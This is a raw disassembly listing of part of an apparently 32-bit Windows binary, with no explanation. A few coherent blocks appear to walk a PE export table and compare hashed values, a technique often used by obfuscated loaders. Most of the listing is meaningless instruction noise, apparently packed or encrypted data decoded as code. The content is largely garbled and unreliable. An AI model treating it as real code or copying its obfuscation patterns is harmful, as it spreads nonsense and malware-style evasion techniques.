  411ba7:	call   DWORD PTR ds:0x4130e4
  411bad:	xor    eax,eax
  411baf:	or     eax,DWORD PTR ds:0x43478f
  411bb5:	dec    eax
  411bb6:	mov    ds:0x43478f,eax
  411bbb:	jmp    0x411b83
  411bc0:	add    DWORD PTR ds:0x43466b,edx
  411bc6:	mov    eax,DWORD PTR [ebp-0x4]
  411bc9:	mov    DWORD PTR ds:0x43474b,0x10
  411bd3:	cmp    DWORD PTR ds:0x43474b,0x0
  411bda:	je     0x411c1c
  411be0:	cmp    DWORD PTR ds:0x43474b,0x1b
  411be7:	jne    0x411c0a
  411bed:	push   DWORD PTR [ebp-0x20]
  411bf0:	push   0x4372
  411bf5:	push   0x434955
  411bfa:	push   0x434969
  411bff:	push   0x7ff3
  411c04:	call   DWORD PTR ds:0x4130e8
  411c0a:	mov    ecx,DWORD PTR ds:0x43474b
  411c10:	dec    ecx
  411c11:	mov    DWORD PTR ds:0x43474b,ecx
  411c17:	jmp    0x411bd3
  411c1c:	mov    ecx,DWORD PTR [ebp-0x14]
  411c1f:	xor    eax,esi
  411c21:	add    eax,ebx
  411c23:	cmp    ecx,eax
  411c25:	je     0x411e9b
  411c2b:	mov    eax,DWORD PTR [ebp-0x14]
  411c2e:	mov    eax,DWORD PTR [eax+0x18]
  411c31:	mov    DWORD PTR [ebp-0x20],eax
  411c34:	mov    eax,DWORD PTR [ebp-0x14]
  411c37:	mov    ecx,DWORD PTR [ebp+0x8]
  411c3a:	add    ecx,DWORD PTR [eax+0x20]
  411c3d:	mov    DWORD PTR [ebp-0x28],ecx
  411c40:	mov    eax,DWORD PTR [ebp-0x14]
  411c43:	mov    ecx,DWORD PTR [ebp+0x8]
  411c46:	add    ecx,DWORD PTR [eax+0x24]
  411c49:	mov    DWORD PTR [ebp-0x2c],ecx
  411c4c:	mov    eax,DWORD PTR [ebp-0x14]
  411c4f:	mov    ecx,DWORD PTR [ebp+0x8]
  411c52:	add    ecx,DWORD PTR [eax+0x1c]
  411c55:	xor    esi,esi
  411c57:	mov    DWORD PTR [ebp-0x14],ecx
  411c5a:	mov    eax,DWORD PTR [ebp-0x28]
  411c5d:	mov    ecx,DWORD PTR [ebp+0x8]
  411c60:	jmp    0x411e60
  411c65:	scas   al,BYTE PTR es:[edi]
  411c66:	repz push esi
  411c68:	add    dl,BYTE PTR [ebx-0x5d]
  411c6b:	push   0x73
  411c6d:	out    dx,eax
  411c6e:	sub    DWORD PTR [ecx+0x2f],esp
  411c71:	hlt    
  411c72:	dec    esp
  411c73:	icebp  
  411c74:	ins    DWORD PTR es:[edi],dx
  411c75:	aad    0x56
  411c77:	jle    0x411cf7
  411c79:	pop    ecx
  411c7a:	jg     0x411cfa
  411c7c:	jle    0x411cb0
  411c7e:	jl     0x411cc5
  411c80:	jns    0x411c1b
  411c82:	cld    
  411c83:	sbb    DWORD PTR [esi],eax
  411c85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c86:	lock adc cl,BYTE PTR [ebp+0x4e02d37e]
  411c8d:	ret    
  411c8e:	jl     0x411c16
  411c90:	add    al,0x10
  411c92:	hlt    
  411c93:	nop
  411c94:	jle    0x411cb9
  411c96:	adc    al,0x24
  411c98:	nop
  411c99:	jp     0x411cb4
  411c9b:	push   esp
  411c9c:	arpl   WORD PTR [ecx-0x79],dx
  411c9f:	bound  esi,QWORD PTR [ebx+0x61]
  411ca2:	jo     0x411c87
  411ca4:	or     BYTE PTR [ecx-0x5a],bh
  411ca7:	stc    
  411ca8:	js     0x411d15
  411caa:	leave  
  411cab:	sbb    dl,ah
  411cad:	mov    dh,0xc4
  411caf:	mov    bh,0x91
  411cb1:	call   eax
  411cb3:	mov    eax,ds:0x2a9f92e7
  411cb8:	push   eax
  411cb9:	(bad)  
  411cba:	sbb    ebx,DWORD PTR [edx]
  411cbc:	jb     0x411cfb
  411cbe:	dec    eax
  411cbf:	mov    edi,0x98aaa76e
  411cc4:	fwait
  411cc5:	inc    ebx
  411cc6:	es inc ecx
  411cc8:	mov    ebp,DWORD PTR [ebx]
  411cca:	cli    
  411ccb:	cdq    
  411ccc:	outs   dx,DWORD PTR ds:[esi]
  411ccd:	retf   
  411cce:	fimul  DWORD PTR [ebx-0x3e86c846]
  411cd4:	repz out dx,eax
  411cd6:	pop    ebp
  411cd7:	mov    eax,ds:0x6d891e2b
  411cdc:	pop    esi
  411cdd:	imul   ecx,DWORD PTR [ebx+0x2e],0xffffffcc
  411ce1:	js     0x411cf9
  411ce3:	shl    BYTE PTR [eax],0x6c
  411ce6:	in     eax,dx
  411ce7:	add    eax,0x4e686cb2
  411cec:	mov    al,ds:0x3d407301
  411cf1:	leave  
  411cf2:	stc    
  411cf3:	add    dh,dh
  411cf5:	dec    eax
  411cf6:	cmc    
  411cf7:	(bad)  [eax+0x992a033]
  411cfd:	pop    ss
  411cfe:	das    
  411cff:	push   ecx
  411d00:	add    al,0x3
  411d02:	pusha  
  411d03:	aaa    
  411d04:	pop    edx
  411d05:	or     ch,BYTE PTR [ebp-0x2af51692]
  411d0b:	mov    eax,ds:0xa8aa9dc2
  411d10:	add    eax,0x68d440ff
  411d15:	mov    ch,0xac
  411d17:	jle    0x411d29
  411d19:	jmp    0xbfb61d0a
  411d1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d1f:	adc    DWORD PTR [edi-0x39],0xffffffa7
  411d23:	inc    edx
  411d24:	pop    esi
  411d25:	push   cs
  411d26:	pop    ebx
  411d27:	mov    ebx,0x94d48486
  411d2c:	inc    esi
  411d2d:	mov    dh,BYTE PTR [esi-0x14645f5f]
  411d33:	ins    DWORD PTR es:[edi],dx
  411d34:	xchg   esp,eax
  411d35:	fwait
  411d36:	mov    esi,0x14771509
  411d3b:	jle    0x411ceb
  411d3d:	mov    ds:0xbea4e6fb,al
  411d42:	mov    esi,0xa985c43c
  411d47:	cmp    eax,edi
  411d49:	jmp    0x4a:0xe2008602
  411d50:	pushf  
  411d51:	jno    0x411cea
  411d53:	loop   0x411d85
  411d55:	in     eax,dx
  411d56:	sub    esi,DWORD PTR [ebx+edx*4+0x55]
  411d5a:	cmp    DWORD PTR [ebx+0x2b],edi
  411d5d:	ror    ebp,1
  411d5f:	faddp  st(3),st
  411d61:	call   0x4b9641e9
  411d66:	leave  
  411d67:	clc    
  411d68:	pop    ecx
  411d69:	popa   
  411d6a:	mov    bh,BYTE PTR [ecx+0x68]
  411d6d:	nop    DWORD PTR [ebx+0x42]
  411d71:	sbb    al,0xc0
  411d73:	loop   0x411ddb
  411d75:	push   0x3c
  411d77:	mov    esp,0x46fec593
  411d7c:	js     0x411d39
  411d7e:	sub    BYTE PTR [edx+eax*1-0x5e],0xcf
  411d83:	and    BYTE PTR [esi-0x380ad0f4],0xe8
  411d8a:	mov    DWORD PTR [ecx],esp
  411d8c:	jl     0x411d61
  411d8e:	or     eax,0xb343b04c
  411d93:	lea    ebx,[ebx+0x1cd6a46d]
  411d99:	loop   0x411dcc
  411d9b:	leave  
  411d9c:	pop    ebx
  411d9d:	out    dx,al
  411d9e:	mov    cl,0xf9
  411da0:	std    
  411da1:	cs push edi
  411da3:	shl    DWORD PTR [esi],0xab
  411da6:	push   ss
  411da7:	setno  BYTE PTR [eax+0x61be7392]
  411dae:	jb     0x411d6f
  411db0:	sbb    BYTE PTR [edx+esi*8],0x16
  411db4:	retf   0x5db4
  411db7:	pushf  
  411db8:	test   eax,0xf23fd25e
  411dbd:	out    dx,al
  411dbe:	sub    ch,BYTE PTR [esi+0x333addb7]
  411dc4:	sub    DWORD PTR [ebx-0x5c82c070],ebx
  411dca:	mov    ds:0xc8dcd583,al
  411dcf:	call   0x1e7dfa23
  411dd4:	test   eax,0xef0b991f
  411dd9:	cmp    eax,0xe9154b1b
  411dde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ddf:	ja     0x411d7d
  411de1:	mov    ebp,0x39c4f596
  411de6:	inc    esi
  411de7:	pop    es
  411de8:	jge    0x411dbc
  411dea:	lock dec esp
  411dec:	jmp    FWORD PTR ds:0xe1d2bf8d
  411df2:	jg     0x411e6f
  411df4:	call   FWORD PTR [edi+0x71]
  411df7:	xchg   edx,eax
  411df8:	shr    DWORD PTR [eax-0x24],cl
  411dfb:	test   ebx,0x6883011d
  411e01:	inc    eax
  411e02:	jo     0x411e2c
  411e04:	mov    bl,0x14
  411e06:	mov    WORD PTR [ebx],fs
  411e08:	das    
  411e09:	shr    ecx,0x36
  411e0c:	stos   DWORD PTR es:[edi],eax
  411e0d:	adc    edi,DWORD PTR ds:0x599cdcb3
  411e13:	call   0xd2b3199e
  411e18:	push   esp
  411e19:	lock push cs
  411e1b:	mov    ds:0x690bc817,eax
  411e20:	icebp  
  411e21:	fld    TBYTE PTR [eax+edx*8-0x26]
  411e25:	mov    WORD PTR [edx],gs
  411e27:	mov    edx,0xc861b577
  411e2c:	push   cs
  411e2d:	push   edi
  411e2e:	sub    DWORD PTR [ebx+esi*1],ebx
  411e31:	(bad)  
  411e32:	(bad)  
  411e33:	jb     0x411ea1
  411e35:	add    ebp,DWORD PTR [edx]
  411e37:	push   edi
  411e38:	stos   DWORD PTR es:[edi],eax
  411e39:	and    DWORD PTR [edx],ebx
  411e3b:	int3   
  411e3c:	into   
  411e3d:	inc    ecx
  411e3e:	out    dx,eax
  411e3f:	in     eax,0x17
  411e41:	jecxz  0x411eae
  411e43:	pushf  
  411e44:	ficomp DWORD PTR [ebx+0x55]
  411e47:	sbb    BYTE PTR [ebx-0x4f],0x76
  411e4b:	popa   
  411e4c:	inc    ebp
  411e4d:	dec    esi
  411e4e:	pop    esp
  411e4f:	dec    esi
  411e50:	adc    eax,0xd9db6b2f
  411e55:	hlt    
  411e56:	mov    ch,BYTE PTR fs:[edi+edx*2+0x1837779c]
  411e5e:	shr    esi,0x3
  411e61:	or     al,0xb8
  411e63:	lea    eax,[ebp-0x8]
  411e66:	mov    DWORD PTR [ebp-0x30],ecx
  411e69:	push   eax
  411e6a:	push   DWORD PTR [ebp-0x30]
  411e6d:	push   DWORD PTR [ebp+0xc]
  411e70:	call   0x402e72
  411e75:	mov    eax,DWORD PTR [ebp-0x4]
  411e78:	mov    ecx,DWORD PTR [ebp-0x8]
  411e7b:	xor    eax,0x7510851
  411e80:	add    eax,ebx
  411e82:	cmp    ecx,eax
  411e84:	jne    0x411ea7
  411e8a:	mov    eax,DWORD PTR [ebp-0x20]
  411e8d:	inc    edi
  411e8e:	cmp    edi,eax
  411e90:	jb     0x411a92
  411e96:	jmp    0x4122b7
  411e9b:	mov    eax,DWORD PTR [ebp-0x4]
  411e9e:	xor    eax,esi
  411ea0:	add    eax,ebx
  411ea2:	jmp    0x412c05
  411ea7:	mov    eax,DWORD PTR [ebp-0x2c]
  411eaa:	movzx  eax,WORD PTR [eax+edi*2]
  411eae:	jmp    0x4120ae
  411eb3:	retf   
  411eb4:	dec    ebp
  411eb5:	add    DWORD PTR [edi+0x6d757391],esi
  411ebb:	je     0x411ea0
  411ebd:	jge    0x411f08
  411ebf:	fcmovnb st,st(3)
  411ec1:	pop    es
  411ec2:	push   esp
  411ec3:	xor    BYTE PTR [eax+0x7e],dl
  411ec6:	jle    0x411f21
  411ec8:	jg     0x411f48
  411eca:	jle    0x411e87
  411ecc:	jns    0x411f12
  411ece:	cmp    BYTE PTR [ecx],0xbd
  411ed1:	pusha  
  411ed2:	ins    DWORD PTR es:[edi],dx
  411ed3:	inc    ebx
  411ed4:	pop    edi
  411ed5:	push   edi
  411ed6:	in     al,dx
  411ed7:	xor    al,0x25
  411ed9:	cmp    bh,BYTE PTR [esi+0x4c]
  411edc:	sbb    al,0x4d
  411ede:	mov    edi,0x107bdf8c
  411ee3:	loop   0x411e6a
  411ee5:	mov    cl,0x24
  411ee7:	paddsw mm1,QWORD PTR [ecx-0x68]
  411eeb:	dec    esi
  411eec:	enter  0x2a9c,0x54
  411ef0:	mov    ebx,0xba52f2ed
  411ef5:	test   DWORD PTR [ecx],eax
  411ef7:	repnz clc 
  411ef9:	jmp    0x4e48:0x6dccdfe6
  411f00:	pop    ss
  411f01:	fsub   QWORD PTR ds:0x189686dc
  411f07:	and    BYTE PTR [ebx-0x42],cl
  411f0a:	jge    0x411f31
  411f0c:	in     eax,0x44
  411f0e:	aam    0x8
  411f10:	mov    ecx,0x8ff90248
  411f15:	or     BYTE PTR [esi-0x52],bl
  411f18:	push   ebx
  411f19:	dec    ebx
  411f1a:	mov    ah,0xb6
  411f1c:	xor    BYTE PTR [ebp-0x3ad63b4a],dl
  411f22:	xchg   ebp,eax
  411f23:	inc    ebx
  411f24:	xor    eax,0xcd01ee5d
  411f29:	and    BYTE PTR [ebx+0x73],bl
  411f2c:	jne    0x411f4d
  411f2e:	rcr    DWORD PTR [eax+ebx*2+0x38211c9a],1
  411f35:	repnz test al,0x78
  411f38:	push   ebx
  411f39:	dec    esi
  411f3a:	test   DWORD PTR [edx],edi
  411f3c:	dec    ebx
  411f3d:	sbb    DWORD PTR [edi+edi*2+0x6c8f87d5],eax
  411f44:	mov    cl,0x5a
  411f46:	pop    ebp
  411f47:	add    DWORD PTR ds:0xa33ba4b1,0x73
  411f4e:	lea    esi,[ebx-0x70025018]
  411f54:	xchg   ecx,eax
  411f55:	shr    DWORD PTR [esp+edx*2],0x8
  411f59:	push   es
  411f5a:	mov    al,ds:0x55d027c5
  411f5f:	or     dl,BYTE PTR [edi]
  411f61:	fs (bad) 
  411f63:	mov    esp,0x27c8449b
  411f68:	jbe    0x411f07
  411f6a:	push   eax
  411f6b:	xchg   ebp,eax
  411f6c:	jmp    0x93df443a
  411f71:	std    
  411f72:	push   eax
  411f73:	xchg   DWORD PTR [edi],esi
  411f75:	add    ah,BYTE PTR [ebx-0x3679e0c2]
  411f7b:	data16 out dx,al
  411f7d:	std    
  411f7e:	adc    eax,0x4701b972
  411f83:	test   al,0x2c
  411f85:	scas   eax,DWORD PTR es:[edi]
  411f86:	enter  0x35e9,0xa7
  411f8a:	inc    esp
  411f8b:	push   0x41
  411f8d:	mov    esp,ebp
  411f8f:	(bad)
  411f92:	fwait
  411f93:	xchg   esp,eax
  411f94:	mov    cl,0x0
  411f96:	dec    edi
  411f97:	push   es
  411f98:	aad    0x1e
  411f9a:	mov    esp,0x2f16c401
  411f9f:	rcl    DWORD PTR [ebx+ebx*2],cl
  411fa2:	jb     0x411f6f
  411fa4:	push   ds
  411fa5:	mov    ah,0x32
  411fa7:	and    DWORD PTR [esi+0x5489a910],edx
  411fad:	lods   eax,DWORD PTR ds:[esi]
  411fae:	repnz sub BYTE PTR [esi],al
  411fb1:	shl    DWORD PTR [ebx+0x4a],cl
  411fb4:	xchg   DWORD PTR [ebx],ebx
  411fb6:	jns    0x411fc9
  411fb8:	or     DWORD PTR [ecx],ebp
  411fba:	aas    
  411fbb:	adc    eax,0xea901bed
  411fc0:	xchg   BYTE PTR [edx+0x62],al
  411fc3:	(bad)  
  411fc4:	jbe    0x411fcc
  411fc6:	sbb    DWORD PTR [ebx],0xfffffffd
  411fc9:	lahf   
  411fca:	cmp    al,BYTE PTR [edi+0x3564a225]
  411fd0:	outs   dx,BYTE PTR ds:[esi]
  411fd1:	out    0x21,al
  411fd3:	popf   
  411fd4:	into   
  411fd5:	or     BYTE PTR [edx],bl
  411fd7:	mov    ds:0x8a3fc492,al
  411fdc:	dec    edi
  411fdd:	je     0x411fcd
  411fdf:	pop    ebx
  411fe0:	repnz loope 0x411ff2
  411fe3:	push   0x43
  411fe5:	pusha  
  411fe6:	push   ds
  411fe7:	jmp    FWORD PTR [ebp-0x48a3ead5]
  411fed:	mov    eax,0x9475c9b0
  411ff2:	mov    bh,bl
  411ff4:	fnstenv ds:0xa56bff33
  411ffa:	fiadd  WORD PTR ds:0x310d36a3
  412000:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  412002:	jnp    0x411fb7
  412004:	ss xor bh,bl
  412007:	cmp    ecx,ecx
  412009:	mov    al,0xba
  41200b:	jbe    0x412025
  41200d:	xlat   BYTE PTR ds:[ebx]
  41200e:	cmc    
  41200f:	aad    0x4a
  412011:	xor    ebx,DWORD PTR [edi]
  412013:	rcr    DWORD PTR [edx+0x2eab6904],0x65
  41201a:	jecxz  0x411fbe
  41201c:	es dec eax
  41201e:	mov    eax,0x1ca1a076
  412023:	mov    al,0x3
  412025:	add    esi,ecx
  412027:	sar    DWORD PTR [eax-0x36e097f2],0xb1
  41202e:	into   
  41202f:	ficom  DWORD PTR [eax-0x18361277]
  412035:	xlat   BYTE PTR ds:[ebx]
  412036:	mov    eax,ds:0x85c4856f
  41203b:	or     BYTE PTR ds:0xe9a76a6d,al
  412041:	jp     0x411fce
  412043:	jne    0x412042
  412045:	ror    DWORD PTR [ebx+0x49],cl
  412048:	xchg   esi,eax
  412049:	ss es ret 
  41204c:	cmp    DWORD PTR fs:[edx],eax
  41204f:	lods   eax,DWORD PTR ds:[esi]
  412050:	stc    
  412051:	xchg   DWORD PTR [ebp-0x60],ebx
  412054:	or     eax,0xdab8e80d
  412059:	jp     0x412056
  41205b:	jbe    0x412002
  41205d:	jle    0x41208e
  41205f:	lock (bad) 
  412061:	std    
  412062:	ja     0x412014
  412064:	sti    
  412065:	push   ds
  412066:	mov    bh,0x7
  412068:	aad    0x82
  41206a:	pop    esi
  41206b:	js     0x412027
  41206d:	out    0xa8,eax
  41206f:	mov    cl,0x81
  412071:	push   cs
  412072:	sbb    ebx,DWORD PTR [ebp+0x62790f62]
  412078:	dec    ecx
  412079:	aad    0x4
  41207b:	xchg   BYTE PTR [ebx],dl
  41207d:	(bad)
  412081:	jo     0x4120f1
  412083:	nop
  412084:	out    dx,al
  412085:	scas   eax,DWORD PTR es:[edi]
  412086:	pop    ds
  412087:	cmp    BYTE PTR [ebp+eiz*8+0x5e],bh
  41208b:	add    edx,ebx
  41208d:	fadd   QWORD PTR [ebx+edx*1-0x4845d4af]
  412094:	push   eax
  412095:	mov    esi,0x803b2c12
  41209a:	jne    0x41208d
  41209c:	lds    esp,FWORD PTR [edi+0x6f977ded]
  4120a2:	adc    eax,0x54432b1e
  4120a7:	sub    DWORD PTR [eax],esp
  4120a9:	sub    edi,DWORD PTR [eax]
  4120ab:	pop    ebx
  4120ac:	sar    BYTE PTR [esi-0x75],0x4d
  4120b0:	in     al,dx
  4120b1:	mov    eax,DWORD PTR [ecx+eax*4]
  4120b4:	jmp    0x4122b4
  4120b9:	cmp    DWORD PTR [ecx+ebx*4+0x69156508],esp
  4120c0:	jne    0x4120eb
  4120c2:	xchg   edx,eax
  4120c3:	mov    al,0xd4
  4120c5:	push   edi
  4120c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4120c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4120c8:	jno    0x4120dd
  4120ca:	push   edx
  4120cb:	jle    0x41214b
  4120cd:	pop    ecx
  4120ce:	jg     0x41214e
  4120d0:	jle    0x41213f
  4120d2:	mov    ch,0xa3
  4120d4:	out    0xe9,eax
  4120d6:	push   es
  4120d7:	rcl    ch,0xd
  4120da:	scas   al,BYTE PTR es:[edi]
  4120db:	jo     0x412149
  4120dd:	xor    DWORD PTR [ebp+0x1c5c7662],edi
  4120e3:	(bad)  [ecx]
  4120e5:	stc    
  4120e6:	xor    bh,BYTE PTR [ebx-0xb]
  4120e9:	addr16 push ds
  4120eb:	dec    eax
  4120ec:	sbb    BYTE PTR [edx],al
  4120ee:	bound  ebx,QWORD PTR ds:[esi+0x1f]
  4120f2:	dec    edx
  4120f3:	inc    edi
  4120f4:	add    esp,esi
  4120f6:	scas   al,BYTE PTR es:[edi]
  4120f7:	cmp    esi,DWORD PTR [esp-0x65650141]
  4120fe:	jnp    0x41212b
  412100:	popf   
  412101:	daa    
  412102:	jmp    FWORD PTR [ebx-0x573a15c7]
  412108:	ror    BYTE PTR [edx],1
  41210a:	js     0x4120d3
  41210c:	stc    
  41210d:	out    dx,eax
  41210e:	ss mov ch,0x7f
  412111:	iret   
  412112:	mov    al,ds:0xfc0db5ce
  412117:	repz repnz fst DWORD PTR [ebp-0x36]
  41211c:	stc    
  41211d:	shr    BYTE PTR [edx],1
  41211f:	scas   al,BYTE PTR es:[edi]
  412120:	mov    dl,BYTE PTR [eax+0x56a35117]
  412126:	pop    esp
  412127:	xchg   ebx,eax
  412128:	inc    esp
  412129:	sub    esp,DWORD PTR [eax]
  41212b:	inc    eax
  41212c:	cmp    bl,bh
  41212e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41212f:	fsubp  st(4),st
  412131:	sub    cl,ah
  412133:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412134:	inc    esp
  412135:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412136:	(bad)  
  412137:	mov    DWORD PTR [edi],esi
  412139:	xchg   ebp,eax
  41213a:	or     ebp,edx
  41213c:	jne    0x4121ae
  41213e:	mov    bl,0x50
  412140:	sub    eax,0x52e9b48b
  412145:	push   esp
  412146:	js     0x412176
  412148:	dec    eax
  412149:	sub    eax,0xbd59a589
  41214e:	gs xchg edx,eax
  412150:	cwde   
  412151:	xor    al,0xda
  412153:	xchg   DWORD PTR cs:[ecx+0x2d],ebp
  412157:	loop   0x412191
  412159:	inc    edx
  41215a:	xchg   ecx,eax
  41215b:	ins    BYTE PTR es:[edi],dx
  41215c:	cs xchg ebp,eax
  41215e:	out    0xce,al
  412160:	mov    esp,0x669fbb28
  412165:	mov    al,0x7b
  412167:	rcl    BYTE PTR [edx-0x52],cl
  41216a:	push   esp
  41216b:	into   
  41216c:	sub    al,bh
  41216e:	out    dx,eax
  41216f:	scas   al,BYTE PTR es:[edi]
  412170:	data16 jge 0x412163
  412173:	pop    es
  412174:	mul    BYTE PTR [edx-0x4e]
  412177:	mul    DWORD PTR [ebp+0x5e9dab05]
  41217d:	xchg   esi,eax
  41217e:	clc    
  41217f:	cmp    DWORD PTR [edi*2-0x69fd75c6],ecx
  412186:	jb     0x4121cc
  412188:	xor    eax,0xf6deda21
  41218d:	push   ss
  41218e:	cmp    eax,0x9def355e
  412193:	lea    ebx,[ebx+edi*2]
  412196:	not    edx
  412198:	push   ebx
  412199:	mov    ds:0xdeeee89c,al
  41219e:	pushf  
  41219f:	sub    DWORD PTR [esi],0x3b
  4121a2:	into   
  4121a3:	pop    es
  4121a4:	push   ecx
  4121a5:	adc    eax,0xe9126711
  4121aa:	adc    al,0x47
  4121ac:	hlt    
  4121ad:	jno    0x4121e8
  4121af:	jmp    0x5f67:0x48b3b5ff
  4121b6:	and    ah,ah
  4121b8:	pop    ecx
  4121b9:	shr    eax,0xee
  4121bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4121bd:	es mov dl,0xf8
  4121c0:	iret   
  4121c1:	addr16 dec ebx
  4121c3:	mov    bl,0x3d
  4121c5:	adc    eax,0x9bd109bb
  4121ca:	mov    eax,0xb4a70575
  4121cf:	std    
  4121d0:	cmc    
  4121d1:	fild   DWORD PTR [eax]
  4121d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4121d4:	aas    
  4121d5:	xchg   esp,eax
  4121d6:	fsubrp st(0),st
  4121d8:	dec    ecx
  4121d9:	cmp    cl,dh
  4121db:	aaa    
  4121dc:	sub    edi,DWORD PTR cs:[esi+ecx*8]
  4121e0:	ds jo  0x41224d
  4121e3:	or     al,0xf7
  4121e5:	mov    bh,0x51
  4121e7:	xor    BYTE PTR [eax],0x66
  4121ea:	mov    esi,0xc3724f24
  4121ef:	cmp    dl,cl
  4121f1:	out    dx,al
  4121f2:	in     eax,dx
  4121f3:	ins    DWORD PTR es:[edi],dx
  4121f4:	and    esp,DWORD PTR [esi+0x2503519]
  4121fa:	jbe    0x41225c
  4121fc:	sbb    al,0x98
  4121fe:	cmp    al,0x5e
  412200:	sbb    eax,0x162fa580
  412205:	icebp  
  412206:	inc    edx
  412207:	push   esi
  412208:	inc    edi
  412209:	in     al,dx
  41220a:	enter  0xca6a,0xb5
  41220e:	cmp    ecx,esi
  412210:	fwait
  412211:	icebp  
  412212:	iret   
  412213:	and    edx,esi
  412215:	adc    dl,bl
  412217:	and    al,0xfb
  412219:	imul   DWORD PTR [edi]
  41221b:	cmp    al,0x5b
  41221d:	(bad)  
  41221e:	sub    al,0xde
  412220:	lea    ebp,[eax]
  412222:	jbe    0x41226b
  412224:	sbb    al,dh
  412226:	pop    es
  412227:	clc    
  412228:	mov    ?,WORD PTR [ebx-0x37]
  41222b:	iret   
  41222c:	rcr    DWORD PTR [ebp-0xc],cl
  41222f:	and    al,0x15
  412231:	test   al,0xdc
  412233:	les    esp,FWORD PTR [ebx+0x6c658302]
  412239:	scas   al,BYTE PTR es:[edi]
  41223a:	ffree  st(3)
  41223c:	dec    ecx
  41223d:	mov    ah,0x54
  41223f:	jp     0x41220c
  412241:	aad    0x75
  412243:	retf   
  412244:	adc    BYTE PTR [esi-0x74],al
  412247:	mov    esp,0xf151fe0a
  41224c:	shufps xmm2,xmm4,0x89
  412250:	fsubr  QWORD PTR [edx+0x23]
  412253:	cwde   
  412254:	ror    ebx,1
  412256:	scas   al,BYTE PTR es:[edi]
  412257:	(bad)  
  412258:	int3   
  412259:	clc    
  41225a:	outs   dx,DWORD PTR ds:[esi]
  41225b:	xchg   DWORD PTR [ecx-0x1f],eax
  41225e:	outs   dx,DWORD PTR ds:[esi]
  41225f:	es inc esi
  412261:	and    ch,0x4
  412264:	xor    al,BYTE PTR [esp+eiz*4-0x627bff06]
  41226b:	sbb    dh,cl
  41226d:	(bad)  
  41226e:	int3   
  41226f:	iret   
  412270:	sub    BYTE PTR [edi+0x7a],al
  412273:	pop    esp
  412274:	cli    
  412275:	jge    0x4122c9
  412277:	push   ecx
  412278:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412279:	mov    DWORD PTR [edi-0x46efa430],0xd60f843b
  412283:	cld    
  412284:	push   edi
  412285:	mov    DWORD PTR [eax],0xd5f8e5a7
  41228b:	loope  0x412241
  41228d:	xor    BYTE PTR ds:0x15a026da,0xca
  412294:	(bad)  
  412296:	loope  0x41227e
  412298:	sub    eax,0xd43802fb
  41229d:	cmp    DWORD PTR [eax],0xc04a3e2f
  4122a3:	mov    al,0xa5
  4122a5:	mov    ecx,0x16652ef2
  4122aa:	fwait
  4122ab:	sti    
  4122ac:	sub    eax,0xf40ad916
  4122b1:	leave  
  4122b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4122b3:	dec    ecx
  4122b4:	mov    DWORD PTR [ebp+0xc],eax
  4122b7:	mov    eax,DWORD PTR [ebp-0x4]
  4122ba:	mov    ecx,DWORD PTR [ebp-0x8]
  4122bd:	xor    eax,0x7510851
  4122c2:	add    eax,ebx
  4122c4:	cmp    ecx,eax
  4122c6:	jne    0x4122d9
  4122cc:	mov    eax,DWORD PTR [ebp-0x4]
  4122cf:	xor    eax,0x7510851
  4122d4:	jmp    0x411ea0
  4122d9:	mov    eax,DWORD PTR [ebp+0xc]
  4122dc:	jmp    0x4124dc
  4122e1:	xchg   DWORD PTR [eax],esp
  4122e3:	aam    0x43
  4122e5:	jne    0x41235a
  4122e7:	xchg   ecx,eax
  4122e8:	in     al,dx
  4122e9:	sub    BYTE PTR [ebx+0x6bd913ed],ch
  4122ef:	xchg   ebp,eax
  4122f0:	cwde   
  4122f1:	jle    0x41234f
  4122f3:	jle    0x412373
  4122f5:	pop    ecx
  4122f6:	jg     0x412376
  4122f8:	jle    0x41233c
  4122fa:	inc    ebx
  4122fb:	or     eax,0xa7b3d388
  412300:	mov    eax,ds:0x746eb5f8
  412305:	or     BYTE PTR ds:0x319bebd4,al
  41230b:	ret    
  41230c:	dec    edx
  41230d:	xor    eax,ebx
  41230f:	in     eax,0xe8
  412311:	lods   al,BYTE PTR ds:[esi]
  412312:	addr16 push ebx
  412314:	or     cl,BYTE PTR [esi]
  412316:	push   0xffffffe6
  412318:	mov    esi,0x9542a6fc
  41231d:	mov    eax,0x2dd30e5b
  412322:	dec    edx
  412323:	(bad)  
  412324:	popa   
  412325:	and    ch,bl
  412327:	ss inc ebp
  412329:	sbb    al,BYTE PTR [eax+eiz*2]
  41232c:	inc    eax
  41232d:	and    eax,0x975269a6
  412332:	inc    esi
  412333:	pop    ebx
  412334:	sbb    al,0x7a
  412336:	les    ebx,FWORD PTR [edx+0x27]
  412339:	pop    ss
  41233a:	nop
  41233b:	(bad)  
  41233d:	retf   
  41233e:	dec    esp
  41233f:	jg     0x4122f7
  412341:	shr    BYTE PTR ds:0xa9b811e0,cl
  412347:	push   esp
  412348:	dec    esi
  412349:	test   ebx,esi
  41234b:	call   0x3ec5d3d
  412350:	jg     0x4123a1
  412352:	push   ds
  412353:	ss (bad) 
  412355:	aad    0x39
  412357:	ds (bad) 
  412359:	nop
  41235a:	mov    bh,0xf5
  41235c:	add    BYTE PTR [ebp-0x238bef6e],bl
  412362:	jbe    0x41239c
  412364:	mov    esi,0x956fe5f1
  412369:	mov    dl,0x2c
  41236b:	stos   BYTE PTR es:[edi],al
  41236c:	mov    dl,0xd1
  41236e:	lods   al,BYTE PTR ds:[esi]
  41236f:	cdq    
  412370:	pop    ebx
  412371:	push   esi
  412372:	lock jl 0x412392
  412375:	fst    QWORD PTR [edx]
  412377:	add    ebx,DWORD PTR [edx-0x13]
  41237a:	sbb    DWORD PTR [esi-0x77],edx
  41237d:	jmp    0xeadb628b
  412382:	in     eax,0xea
  412384:	imul   esp,DWORD PTR [eax],0x10864013
  41238a:	xor    BYTE PTR [eax],ch
  41238c:	xchg   edi,eax
  41238d:	sbb    DWORD PTR [ebp+0x62f4442],ecx
